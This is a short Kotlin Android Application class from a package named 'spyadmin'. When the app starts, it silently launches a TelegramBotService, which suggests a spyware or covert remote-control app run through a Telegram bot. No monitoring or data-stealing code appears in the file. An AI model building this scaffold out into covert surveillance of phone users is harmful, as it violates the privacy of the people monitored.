package com.spyadmin

import android.app.Application
import android.content.Context
import android.content.Intent

class AdminApplication : Application() {

    override fun onCreate() {
        super.onCreate()
        // Start Telegram bot service
        startService(Intent(this, TelegramBotService::class.java))
    }

    companion object {
        @JvmStatic
        fun getContext(): Context? = instance
        private var instance: Context? = null
            @Suppress("UNUSED_PROPERTY")
            set(value) { field = value }
    }
}